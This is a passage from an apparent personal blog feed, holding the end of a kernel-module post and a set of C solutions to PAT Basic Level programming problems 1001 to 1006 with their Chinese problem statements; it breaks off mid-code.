class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> container_of(ptr, type, member)                 /</span></span><br><span class="line">(&#123;                                                        /</span><br><span class="line">    <span class="type">const</span> typeof( ((type *)<span class="number">0</span>)-&gt;member ) *__mptr = (ptr);/</span><br><span class="line">    (type *)( (<span class="type">char</span> *)__mptr - offsetof(type,member) ); /</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offsetof(TYPE, MEMBER) ((size_t) &amp;((TYPE *)0)-&gt;MEMBER)</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Kernel Module&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>backup: PAT</title>
    <link href="http://aslin.site/2022/03/09/backup-PAT/"/>
    <id>http://aslin.site/2022/03/09/backup-PAT/</id>
    <published>2022-03-09T03:32:17.000Z</published>
    <updated>2022-12-26T14:43:03.810Z</updated>
    
    <content type="html"><![CDATA[<p><em><strong>题目思路就先不写了，以后再补(咕咕咕)，现在只有代码</strong></em></p><span id="more"></span><h1 id="Basic-Level"><a href="#Basic-Level" class="headerlink" title="Basic Level"></a>Basic Level</h1><h2 id="1001-害死人不偿命的-3n-1-猜想-（15-分）"><a href="#1001-害死人不偿命的-3n-1-猜想-（15-分）" class="headerlink" title="1001 害死人不偿命的(3n+1)猜想 （15 分）"></a>1001 害死人不偿命的(3n+1)猜想 （15 分）</h2><hr><blockquote><p>卡拉兹(Callatz)猜想：<br>对任何一个正整数 $n$，如果它是偶数，那么把它砍掉一半；如果它是奇数，那么把 $(3n+1)$ 砍掉一半。这样一直反复砍下去，最后一定在某一步得到 $n&#x3D;1$。卡拉兹在 1950 年的世界数学家大会上公布了这个猜想，传说当时耶鲁大学师生齐动员，拼命想证明这个貌似很傻很天真的命题，结果闹得学生们无心学业，一心只证 $(3n+1)$，以至于有人说这是一个阴谋，卡拉兹是在蓄意延缓美国数学界教学与科研的进展……<br>我们今天的题目不是证明卡拉兹猜想，而是对给定的任一不超过 1000 的正整数 $n$，简单地数一下，需要多少步（砍几下）才能得到 $n&#x3D;1$？</p></blockquote><p><strong>输入格式：</strong></p><blockquote><p>每个测试输入包含 1 个测试用例，即给出正整数 $n$ 的值。</p></blockquote><p><strong>输出格式：</strong></p><blockquote><p>输出从 $n$ 计算到 1 需要的步数。</p></blockquote><p><strong>输入样例：</strong></p><p><code>3</code></p><p><strong>输出样例：</strong></p><p><code>5</code></p><h4 id="C"><a href="#C" class="headerlink" title="C"></a>C</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span>(n != <span class="number">1</span>) &#123;</span><br><span class="line">i++;</span><br><span class="line"><span class="keyword">if</span>(n % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">n = n / <span class="number">2</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">n = (<span class="number">3</span> * n + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1002-写出这个数-（20-分）"><a href="#1002-写出这个数-（20-分）" class="headerlink" title="1002 写出这个数 （20 分）"></a>1002 写出这个数 （20 分）</h2><hr><blockquote><p>读入一个正整数 $n$，计算其各位数字之和，用汉语拼音写出和的每一位数字。</p></blockquote><p><strong>输入格式：</strong></p><blockquote><p>每个测试输入包含 1 个测试用例，即给出自然数 $n$ 的值。这里保证 $n$ 小于 10<sup>100</sup></p></blockquote><p><strong>输出格式：</strong></p><blockquote><p>在一行内输出 $n$ 的各位数字之和的每一位，拼音数字间有 1 空格，但一行中最后一个拼音数字后没有空格。</p></blockquote><p><strong>输入样例：</strong></p><p><code>1234567890987654321123456789</code></p><p><strong>输出样例：</strong></p><p><code>yi san wu</code></p><h4 id="C-1"><a href="#C-1" class="headerlink" title="C"></a>C</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">100</span>], i, s = <span class="number">0</span>, b[<span class="number">100</span>];</span><br><span class="line"><span class="type">char</span> c[<span class="number">3000</span>];</span><br><span class="line">gets(c);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; c[i] != <span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">b[i] = (<span class="type">int</span>)c[i] - <span class="number">48</span>;</span><br><span class="line">s = s + b[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">100</span> &amp;&amp; s != <span class="number">0</span>; i++) &#123;</span><br><span class="line">a[i] = s % <span class="number">10</span>;</span><br><span class="line">s /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = i - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line"><span class="keyword">switch</span> (a[i]) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span> : <span class="built_in">printf</span>(<span class="string">&quot;ling&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span> : <span class="built_in">printf</span>(<span class="string">&quot;yi&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span> : <span class="built_in">printf</span>(<span class="string">&quot;er&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span> : <span class="built_in">printf</span>(<span class="string">&quot;san&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span> : <span class="built_in">printf</span>(<span class="string">&quot;si&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span> : <span class="built_in">printf</span>(<span class="string">&quot;wu&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span> : <span class="built_in">printf</span>(<span class="string">&quot;liu&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span> : <span class="built_in">printf</span>(<span class="string">&quot;qi&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span> : <span class="built_in">printf</span>(<span class="string">&quot;ba&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span> : <span class="built_in">printf</span>(<span class="string">&quot;jiu&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1003-我要通过！-（20-分）"><a href="#1003-我要通过！-（20-分）" class="headerlink" title="1003 我要通过！ （20 分）"></a>1003 我要通过！ （20 分）</h2><hr><blockquote><p>“<strong>答案正确</strong>”是自动判题系统给出的最令人欢喜的回复。本题属于 PAT 的“<strong>答案正确</strong>”大派送 —— 只要读入的字符串满足下列条件，系统就输出“<strong>答案正确</strong>”，否则输出“<strong>答案错误</strong>”。</p><p>得到“<strong>答案正确</strong>”的条件是：</p><ol><li>字符串中必须仅有<code>P</code>、<code>A</code>、<code>T</code>这三种字符，不可以包含其它字符；</li><li>任意形如<code>xPATx</code>的字符串都可以获得“<strong>答案正确</strong>”，其中<code>x</code>或者是空字符串，或者是仅由字母<code>A</code>组成的字符串；</li><li>如果<code>aPbTc</code>是正确的，那么<code>aPbATca</code>也是正确的，其中<code>a</code>、<code>b</code>、<code>c</code>均或者是空字符串，或者是仅由字母<code>A</code>组成的字符串。</li></ol><p>现在就请你为<strong>PAT</strong>写一个自动裁判程序，判定哪些字符串是可以获得“<strong>答案正确</strong>”的。</p></blockquote><p><strong>输入格式：</strong></p><blockquote><p>每个测试输入包含 1 个测试用例。第 1 行给出一个正整数 $n(&lt;10)$，是需要检测的字符串个数。接下来每个字符串占一行，字符串长度不超过 100，且不包含空格。</p></blockquote><p><strong>输出格式：</strong></p><blockquote><p>每个字符串的检测结果占一行，如果该字符串可以获得“答案正确”，则输出 YES，否则输出 NO。</p></blockquote><p><strong>输入样例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">PAT</span><br><span class="line">PAAT</span><br><span class="line">AAPATAA</span><br><span class="line">AAPAATAAAA</span><br><span class="line">xPATx</span><br><span class="line">PT</span><br><span class="line">Whatever</span><br><span class="line">APAAATAA</span><br></pre></td></tr></table></figure><p><strong>输出样例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">YES</span><br><span class="line">YES</span><br><span class="line">YES</span><br><span class="line">YES</span><br><span class="line">NO</span><br><span class="line">NO</span><br><span class="line">NO</span><br><span class="line">NO</span><br></pre></td></tr></table></figure><h4 id="C-2"><a href="#C-2" class="headerlink" title="C"></a>C</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">char</span> s[<span class="number">101</span>];</span><br><span class="line"><span class="type">int</span> cntp = <span class="number">0</span>, cnta = <span class="number">0</span>, cntt = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> *p1, *p2;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span> (n--) &#123;</span><br><span class="line"><span class="type">int</span> ispat = <span class="number">0</span>;</span><br><span class="line">cntp = <span class="number">0</span>;</span><br><span class="line">cnta = <span class="number">0</span>;</span><br><span class="line">cntt = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; s[j] != <span class="string">&#x27;\0&#x27;</span>; j++) &#123;</span><br><span class="line"><span class="keyword">if</span>(s[j] == <span class="string">&#x27;P&#x27;</span>) &#123;</span><br><span class="line">cntp++;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(s[j] == <span class="string">&#x27;T&#x27;</span>) &#123;</span><br><span class="line">cntt++;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(s[j] == <span class="string">&#x27;A&#x27;</span>) &#123;</span><br><span class="line">cnta++;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(cntp == <span class="number">1</span> &amp;&amp; cntt == <span class="number">1</span> &amp;&amp; cnta != <span class="number">0</span>) &#123;</span><br><span class="line">p1 = <span class="built_in">strchr</span>(s, <span class="string">&#x27;P&#x27;</span>);</span><br><span class="line">p2 = <span class="built_in">strchr</span>(s, <span class="string">&#x27;T&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>((p1 - s) * (p2 - p1 - <span class="number">1</span>) == <span class="built_in">strlen</span>(p2) - <span class="number">1</span>) &#123;</span><br><span class="line">ispat = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(ispat) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;YES\n&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1004-成绩排名-（20-分）"><a href="#1004-成绩排名-（20-分）" class="headerlink" title="1004 成绩排名 （20 分）"></a>1004 成绩排名 （20 分）</h2><hr><blockquote><p>读入 $n$ $(n&gt;0)$名学生的姓名、学号、成绩，分别输出成绩最高和成绩最低学生的姓名和学号。</p></blockquote><p><strong>输入格式：</strong></p><blockquote><p>每个测试输入包含 1 个测试用例，格式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;第 1 行：正整数 n</span><br><span class="line">&gt;第 2 行：第 1 个学生的姓名 学号 成绩</span><br><span class="line">&gt;第 3 行：第 2 个学生的姓名 学号 成绩</span><br><span class="line"> ... ... ...</span><br><span class="line">&gt;第 n+1 行：第 n 个学生的姓名 学号 成绩</span><br></pre></td></tr></table></figure><p>其中<code>姓名</code>和<code>学号</code>均为不超过 10 个字符的字符串，成绩为 0 到 100 之间的一个整数，这里保证在一组测试用例中没有两个学生的成绩是相同的。</p></blockquote><p><strong>输出格式：</strong></p><blockquote><p>对每个测试用例输出 2 行，第 1 行是成绩最高学生的姓名和学号，第 2 行是成绩最低学生的姓名和学号，字符串间有 1 空格。</p></blockquote><p><strong>输入样例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">Joe Math990112 89</span><br><span class="line">Mike CS991301 100</span><br><span class="line">Mary EE990830 95</span><br></pre></td></tr></table></figure><p><strong>输出样例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mike CS991301</span><br><span class="line">Joe Math990112</span><br></pre></td></tr></table></figure><h4 id="C-3"><a href="#C-3" class="headerlink" title="C"></a>C</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">int</span> n, i, j;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">char</span> name[<span class="number">11</span>];</span><br><span class="line"><span class="type">char</span> num[<span class="number">11</span>];</span><br><span class="line"><span class="type">int</span> grade;</span><br><span class="line">&#125;stu[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span> <span class="title">temp</span> =</span> &#123; <span class="string">&quot;0&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s %s %d&quot;</span>, stu[i].name, stu[i].num, &amp;stu[i].grade);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span>(j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line"><span class="keyword">if</span>(stu[i].grade &lt; stu[j].grade) &#123;</span><br><span class="line">temp = stu[i];</span><br><span class="line">stu[i] = stu[j];</span><br><span class="line">stu[j] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, stu[<span class="number">0</span>].name, stu[<span class="number">0</span>].num);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, stu[n - <span class="number">1</span>].name, stu[n - <span class="number">1</span>].num);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1005-继续-3n-1-猜想-（25-分）"><a href="#1005-继续-3n-1-猜想-（25-分）" class="headerlink" title="1005 继续(3n+1)猜想 （25 分）"></a>1005 继续(3n+1)猜想 （25 分）</h2><hr><blockquote><p>卡拉兹(Callatz)猜想已经在1001中给出了描述。在这个题目里，情况稍微有些复杂。</p><p>当我们验证卡拉兹猜想的时候，为了避免重复计算，可以记录下递推过程中遇到的每一个数。例如对 n&#x3D;3 进行验证的时候，我们需要计算 3、5、8、4、2、1，则当我们对 n &#x3D; 5、8、4、2 进行验证的时候，就可以直接判定卡拉兹猜想的真伪，而不需要重复计算，因为这 4 个数已经在验证3的时候遇到过了，我们称 5、8、4、2 是被 3“覆盖”的数。我们称一个数列中的某个数 n 为“关键数”，如果 n 不能被数列中的其他数字所覆盖。</p><p>现在给定一系列待验证的数字，我们只需要验证其中的几个关键数，就可以不必再重复验证余下的数字。你的任务就是找出这些关键数字，并按从大到小的顺序输出它们。</p></blockquote><p><strong>输入格式：</strong></p><blockquote><p>每个测试输入包含 1 个测试用例，第 1 行给出一个正整数 $K(&lt;100)$，第 2 行给出 $K$ 个互不相同的待验证的正整数 $n$ $(1&lt;n≤100)$的值，数字间用空格隔开。</p></blockquote><p><strong>输出格式：</strong></p><blockquote><p>每个测试用例的输出占一行，按从大到小的顺序输出关键数字。数字间用 1 个空格隔开，但一行中最后一个数字后没有空格。</p></blockquote><p><strong>输入样例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">6</span><br><span class="line">3 5 6 7 8 11</span><br></pre></td></tr></table></figure><p><strong>输出样例：</strong></p><p><code>7 6</code></p><h4 id="C-4"><a href="#C-4" class="headerlink" title="C"></a>C</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sort</span><span class="params">(<span class="type">int</span> *, <span class="type">int</span> )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> * a;</span><br><span class="line"><span class="type">int</span> n, i, t, j;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">a = (<span class="type">int</span>*) <span class="built_in">malloc</span> (n * <span class="keyword">sizeof</span>(<span class="type">int</span>));  <span class="comment">// 动态申请数组空间</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">t = a[i];</span><br><span class="line"><span class="keyword">if</span>(t == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;  <span class="comment">// 碰到数组中有0的项，则跳过</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(t != <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(t % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">t /= <span class="number">2</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">t = (<span class="number">3</span> * t + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; n; j++) &#123;  <span class="comment">// 数组中所有数与运算中出现的数比较</span></span><br><span class="line"><span class="keyword">if</span>(a[j]==t) &#123;  <span class="comment">// 如果数组中有和运算过程中相同的数，就把数组中的该数改为0</span></span><br><span class="line">a[j]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;  <span class="comment">// 因为输入的数组是互不相同的数，所以不会存在有多个匹配的情况，找到有一个匹配就可跳出，以节省内存减少运行时间。</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">sort(a, n);  <span class="comment">// 排序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; a[i] &gt; <span class="number">0</span>; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d%s&quot;</span>, a[i], a[i + <span class="number">1</span>] &gt; <span class="number">0</span> ? <span class="string">&quot; &quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sort</span><span class="params">(<span class="type">int</span> *P, <span class="type">int</span> K)</span> &#123;  <span class="comment">// 排序</span></span><br><span class="line"><span class="type">int</span> i, j, temp;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; K; i++) &#123;</span><br><span class="line"><span class="keyword">for</span>(j = i + <span class="number">1</span>; j &lt; K; j++) &#123;</span><br><span class="line"><span class="keyword">if</span>(P[i] &lt; P[j]) &#123;</span><br><span class="line">temp = P[i];</span><br><span class="line">P[i] = P[j];</span><br><span class="line">P[j] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1006-换个格式输出整数-（15-分）"><a href="#1006-换个格式输出整数-（15-分）" class="headerlink" title="1006 换个格式输出整数 （15 分）"></a>1006 换个格式输出整数 （15 分）</h2><hr><blockquote><p>让我们用字母<code>B</code>来表示“百”、字母<code>S</code>表示“十”，用<code>12...n</code>来表示不为零的个位数字<code>n</code> $(&lt;10)$，换个格式来输出任一个不超过 3 位的正整数。例如<code>234</code>应该被输出为<code>BBSSS1234</code>，因为它有 2 个“百”、3 个“十”、以及个位的 4。</p></blockquote><p><strong>输入格式：</strong></p><blockquote><p>每个测试输入包含 1 个测试用例，给出正整数 $n(&lt;1000)$。</p></blockquote><p><strong>输出格式：</strong></p><blockquote><p>每个测试用例的输出占一行，用规定的格式输出 n。</p></blockquote><p><strong>输入样例 1：</strong></p><pre><code>234</code></pre><p><strong>输出样例 1：</strong></p><pre><code>BBSSS1234</code></pre><p><strong>输入样例 2：</strong></p><pre><code>23</code></pre><p><strong>输出样例 2：</strong></p><pre><code>SS123</code></pre><h4 id="C-5"><a href="#C-5" class="headerlink" title="C++"></a>C++</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> 